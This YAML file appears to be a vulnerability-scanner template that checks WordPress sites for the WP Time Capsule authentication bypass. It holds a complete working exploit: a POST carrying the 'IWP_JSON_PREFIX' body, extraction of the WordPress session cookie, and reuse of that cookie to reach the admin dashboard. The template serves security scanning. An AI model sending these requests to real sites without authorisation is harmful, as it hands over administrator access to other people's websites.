id: wordpress-auth-bypass-wptimecapsule
info:
  author: princechaddha
  name: WordPress WP Time Capsule Authentication Bypass
  reference: https://github.com/SECFORCE/WPTimeCapsulePOC
  severity: critical
  tags: wordpress,wp-plugin
requests:
- cookie-reuse: true
  extractors:
  - part: header
    regex:
    - wordpress_[a-z0-9]+=([A-Za-z0-9%]+)
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <div id="adminmenumain" role="navigation" aria-label="Main menu">
    - <h1>Dashboard</h1>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Accept: */*


    IWP_JSON_PREFIX

    '
  - 'GET /wp-admin/index.php HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Accept: */*

    '
